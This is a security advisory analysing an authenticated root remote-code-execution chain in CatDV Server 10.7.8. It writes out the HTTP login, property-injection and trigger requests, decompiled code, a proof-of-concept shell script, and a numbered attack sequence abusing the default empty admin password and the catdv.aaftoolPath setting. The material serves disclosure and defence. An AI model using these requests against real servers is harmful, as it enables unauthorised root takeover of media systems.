# CatDV Server Authenticated aaftoolPath Root RCE - Technical Analysis

## Overview

CatDV Server 10.7.8 is a closed-source broadcast media asset management (MAM) server from Square Box Systems (UK; MAM business acquired by Quantum), built on Java 17 with an embedded Tomcat 9.0.106, an RMI registry on port 1099, a web/REST API on port 8181, and a MySQL backend. The server exposes two inbound services: `squarebox.catdv.server.rmiapi.RmiService` (the `ServerAPI` RMI interface on 1099) and the embedded Tomcat (`catdv.war`, REST `/catdv/api/*` plus RMI-over-HTTP `/catdv/rmi/*` on 8181). This advisory documents an authenticated root RCE: an admin user can write the type-23 "server-config" setting, which `ServerSettings.loadSettingsFromDatabase` applies verbatim as JVM `System.setProperty(key, value)` pairs with no property whitelist. The `catdv.aaftoolPath` property is read by `AAFExportHandler.java:97` on every AAF export request and executed at L111 via `ProcessUtils.exec` with the server process privileges (root). The property is auto-applied by `CacheManager.checkCaches` on the next request (1s throttle), so no restart is needed. Dynamic verification produced `uid=0(root) gid=0(root)` written by the root-owned CatDV process.

This is the authenticated variant of the CatDV root RCE. The unauthenticated chain (which mints a zero-credential `ClientID` via RMI `connect(null)` and writes `aaftoolPath` without admin) is tracked in a separate advisory. Here, admin credentials are a precondition; in practice the factory-default empty admin password (`create_catdv.sql:294`) makes the bar low, but that default-credential defect is a separate advisory.

## Architecture

```
L1 external access: RMI 1099 (squarebox.catdv.server.rmiapi.RmiService / ServerAPI) + Web 8181 (embedded Tomcat, catdv.war)
L2 boundary: plain TCP RMI on 1099; HTTP on 8181
L3 gateway: RmiService (RMI) + CatDVRestService (REST dispatch /catdv/api/*)
L4 auth: REST SessionHandler (JSESSIONID + catdv_authenticated_user cookie); RMI ClientID (ConnectionManager.connect)
L5 business: RmiService methods (performCommand/callRESTAPI/importCatalog/saveSettings/...) + REST handlers (ClipHandler/SettingsHandler/SessionHandler/AAFExportHandler)
L6 storage: MySQL (c_user / c_settings / c_clip / ...) + JVM System properties (catdv.*)
```

The two inbound ports and their auth models:

| Port | Service | Auth model |
|------|---------|------------|
| 1099 | RMI ServerAPI | ClientID (ConnectionManager.connect) |
| 8181 | REST /catdv/api/* | JSESSIONID + catdv_authenticated_user cookie (SessionHandler) |

REST `requiresIdentity` gates most handlers. `SessionHandler.processPost` (login) and a few others are `requiresIdentity=false`. The AAF export sink (`AAFExportHandler`) is reached via `GET /catdv/api/1/clips?fmt=aaf&clipListID=1`, which requires an admin session.

## Stage 1: Admin Login (Precondition)

The attacker needs an admin session on the web API. The factory-default DB seed `create_catdv.sql:294` provides one with no password:

```sql
INSERT INTO c_user VALUES(0,-1,'admin','Administrator',0,0,NULL,0);
--                          ^id ^grp ^name ^desc  ^pw ^hash ^...
-- password=0, passwordHash=NULL (factory default)
```

`Encryption.a("", null, 0)` skips PBKDF2 when `passwordHash==null` and falls back to the legacy `simpleMD5Hash` path: `simpleMD5Hash("")=0`, and `0 == 0` (storedPassword) -> true.

```java
public static boolean a(String password, String passwordHash, int storedPassword) {
    if (passwordHash != null && passwordHash.length() > 0) {
        // PBKDF2 path (factory default not set, skipped)
        ...
    }
    int n4 = simpleMD5Hash(password);      // simpleMD5Hash("") = 0
    return n4 == storedPassword;           // 0 == 0 -> true
}

public static int simpleMD5Hash(String s) {
    if (s == null || s.length() == 0) return 0;     // <- empty string returns 0
    ...
}
```

### Login request

```
POST /catdv/api/1/session HTTP/1.1
Content-Type: application/json
CatDV-Client: web

{"username":"admin","password":""}
```

Nashorn (removed in Java 17) breaks the JSON response body serialization -> HTTP 500, **but the `Set-Cookie` headers still prove the login succeeded** (cookies are set before body serialization):

```
HTTP/1.1 500
Set-Cookie: JSESSIONID=BDE2B824315859C730DB377D1FD13717; Path=/catdv; HttpOnly
Set-Cookie: catdv_authenticated_user=admin; Path=/catdv; HttpOnly
```

The `JSESSIONID` and `catdv_authenticated_user=admin` cookies are extracted from the `Set-Cookie` header (not the body). The HTTP 500 is a body-serialization failure, not a login failure. On deployments where the response body serializes correctly, the body contains `{"status":"OK","data":{"user":"admin","isAdmin":true,"jsessionid":"..."}}`.

## Stage 2: Property Injection via `PUT settings/server-config/{id}`

### The source: no whitelist on `System.setProperty`

`ServerSettings.loadSettingsFromDatabase` (L362-410) iterates each key in the type-23 server-config JSON and calls `System.setProperty(key, value)` verbatim:

```java
// ServerSettings.java L362-410 (CFR decompilation)
for (SSettings s : settingsRows) {
    if (s.type == TYPE_SERVER_SETTINGS) {
        JSONObject json = new JSONObject(new String(s.value));
        for (String key : json.keys()) {
            System.setProperty(key, json.getString(key));  // <- no whitelist, any catdv.* property
        }
    }
}
```

Any `catdv.*` property can be injected, including the exec-path properties `aaftoolPath`, `ffmpegPath`, `libreOfficePath`.

### The write: HTTP admin path

`PUT /catdv/api/1/settings/server-config/{id}` -> `SettingsHandler.processPut` -> `SettingsData.d` writes the type-23 row to the `c_settings` table.

```
PUT /catdv/api/1/settings/server-config/101 HTTP/1.1
Cookie: JSESSIONID=<admin_jsid>
Content-Type: application/json
CatDV-Client: web

{"name":"server-config","value":"{\"catdv.aaftoolPath\":\"/tmp/evil.sh\"}"}
```

### Auto-apply (no restart needed)

`SettingsData.d` writes the DB row -> `CacheManager.a.a(dc, 1)` (cache set version 1) -> `checkCaches` on every subsequent request (1s throttle) -> `ServerSettings.reload` -> `loadSettingsFromDatabase` iterates keys and calls `System.setProperty`. The injected `catdv.aaftoolPath` becomes a live JVM system property within the 1s throttle window.

## Stage 3: AAF Export Trigger Reaches `ProcessUtils.exec`

### The exec sink

```java
// AAFExportHandler.java (CFR decompilation)
// L97 — read catdv.aaftoolPath system property on every request (attacker-controlled via saveSettings)
object4 = System.getProperty("catdv.aaftoolPath");
// L99-105 — verify the path exists and is executable
if (object4 == null || !new File(object4).exists()) {
    throw new RuntimeException("AAF tool not configured");
}
// L111 — ProcessUtils.exec with the server process privileges (root)
ai.a(new String[]{object4, "-ss", string, string2}, true);  // = ProcessUtils.exec
```

`ai.a(...)` is `squarebox.catdv.common.io.a.ai.a(cmd[], redirect)` -> `ProcessBuilder.start()`, which executes the script pointed to by `aaftoolPath` with the CatDV process privileges (root), followed by `-ss <xml> <aaf>` arguments.

### Empty clipList bypass

`AAFExportHandler.processRequest` calls `g.a(clips, ...)` (the AAFXMLExporter) **before** the `exportXML` check. If the clipList is non-empty, each clip's `getType()` (`Clip.java` L191-193) calls `typeForName(sClip.type)` when `typeID<=0`. A seed clip with `type=NULL` makes `typeForName("0")` throw `NoSuchElementException("Unknown type '0'")` (`Clip.java` L122), which blocks control flow from reaching the exec sink.

```java
// Clip.java L122
public static ClipType typeForName(String name) {
    ClipType t = TYPES.get(name);
    if (t == null) throw new NoSuchElementException("Unknown type '" + name + "'");
    return t;
}
```

**Fix**: use an empty clipList (no `clipListMember` rows; `clipListID=1` but the list has no members) -> `g.a()` does not iterate an empty list -> no type check -> control flow reaches the L111 exec sink.

### Trigger request

```
GET /catdv/api/1/clips?fmt=aaf&clipListID=1 HTTP/1.1
CatDV-Client: web
Cookie: JSESSIONID=...; catdv_authenticated_user=admin
```

## Dynamic Verification

`server.log` (ProcessUtils.exec invocation evidence):
```
[41;12:47:22.559] exec: /tmp/evil.sh -ss /tmp/catdv8347596604326512916xml /tmp/catdv10089934903309826957aaf
```

marker (`/tmp/aaftool_rce.txt`, 36 bytes, root:root):
```
uid=0(root) gid=0(root) groups=0(root)
```

`/tmp/evil.sh` (chmod 755):
```sh
#!/bin/sh
id > /tmp/aaftool_rce.txt 2>&1
chmod 644 /tmp/aaftool_rce.txt 2>/dev/null
```

The CatDV server process runs as root; `ProcessUtils.exec` fork+execs `evil.sh` as root, so the marker is written by root.

## Data Flow

```
Attacker (admin session)
  -> PUT /catdv/api/1/settings/server-config/101 {"catdv.aaftoolPath":"/tmp/evil.sh"}
  -> SettingsData.d writes c_settings row (type=23, name=server-config, value={"catdv.aaftoolPath":"/tmp/evil.sh"})
  -> CacheManager set version 1
  -> next request checkCaches (1s throttle) -> ServerSettings.reload
  -> loadSettingsFromDatabase -> System.setProperty("catdv.aaftoolPath", "/tmp/evil.sh")
  -> JVM system property is now set

Attacker GET /catdv/api/1/clips?fmt=aaf&clipListID=1 (admin identity, empty clipList)
  -> CatDVRestService routes to ClipHandler
  -> ClipHandler handles fmt=aaf -> AAFExportHandler.processRequest
  -> L97: object4 = System.getProperty("catdv.aaftoolPath") = "/tmp/evil.sh"
  -> L111: ProcessUtils.exec(["/tmp/evil.sh", "-ss", xml, aaf])  <- root exec
```

## Exploitation Prerequisites (Honest Disclosure)

This is an **authenticated** RCE. The attacker needs an admin session on the CatDV web API (port 8181). The factory-default empty admin password (`create_catdv.sql:294`) makes the bar low in practice, but that default-credential defect is a separate advisory; this advisory treats admin credentials as a given precondition.

| Entry / condition | Default? | Notes |
|---|---|---|
| Web 8181 reachable | yes | — |
| admin credentials | factory-default empty password (separate advisory) | this advisory treats admin as a precondition |
| `ServerSettings` no property whitelist | yes | — |
| `AAFExportHandler` exec | yes (L111 ProcessUtils.exec) | — |
| CatDV runs as root | deployment-dependent | the CatDV process privileges are the privileges gained |

**On deployments where the admin password has been changed**, this authenticated RCE still works if the attacker has any valid admin credential; the property injection and exec sink do not depend on the password being empty.

## Complete Attack Sequence

1. **Obtain an admin session**: log in to the CatDV web API as admin (e.g. via the factory-default empty password, tracked separately, or any known admin credential).
2. **Stage `/tmp/evil.sh`**: write a shell script that runs the attacker command and writes the output to a marker file; `chmod 755`.
3. **Inject `catdv.aaftoolPath`**: `PUT /catdv/api/1/settings/server-config/{id}` with `{"name":"server-config","value":"{\"catdv.aaftoolPath\":\"/tmp/evil.sh\"}"}` — `CacheManager.checkCaches` auto-applies the property on the next request (1s throttle).
4. **Trigger the AAF export**: `GET /catdv/api/1/clips?fmt=aaf&clipListID=1` with the admin cookie and an empty clipList — `AAFExportHandler.java:111` runs `ProcessUtils.exec("/tmp/evil.sh", "-ss", xml, aaf)` as root.
5. **Verify**: read the marker file — `uid=0(root) gid=0(root)` confirms root command execution.

## Key Technical Insights

1. **No property whitelist on `System.setProperty`**: `ServerSettings.loadSettingsFromDatabase` iterates each key in the server-config JSON and calls `System.setProperty(key, value)` verbatim. Any `catdv.*` property can be injected, including the exec-path properties `aaftoolPath`, `ffmpegPath`, `libreOfficePath`.

2. **The exec sink reads a mutable system property on every request**: `AAFExportHandler.java:97` reads `catdv.aaftoolPath` fresh on each AAF export, and L111 `ProcessUtils.exec`s it as root. Combined with the auto-apply (no restart needed), the property injection takes effect within the 1s `checkCaches` throttle.

3. **Empty clipList bypasses the type check**: a non-empty clipList triggers `typeForName("0")` which throws `NoSuchElementException` and blocks the exec sink; an empty clipList skips iteration and reaches L111.

4. **Auto-apply means no restart**: `CacheManager.checkCaches` reloads server-config on every request (1s throttle), so the injected property becomes live without a server restart — the attacker can write-then-trigger in a single session.

5. **Factory-default empty admin password lowers the real-world bar**: `create_catdv.sql:294` seeds `admin` with `password=0, passwordHash=NULL`; `Encryption.a` falls back to `simpleMD5Hash("")=0 == 0`. The Nashorn-induced HTTP 500 breaks only the response body, not the `Set-Cookie` headers that prove the login. This is a separate advisory but is the practical entry point for most deployments.

## Credits

Discovered by 0day Rubbish Project using automated AI vulnerability research with multi-LLM ensemble (Claude, OpenAI, DeepSeek, GLM).

---

*Disclaimer: This research was conducted for defensive purposes. Always obtain proper authorization before testing systems you don't own. Responsible disclosure practices apply.*
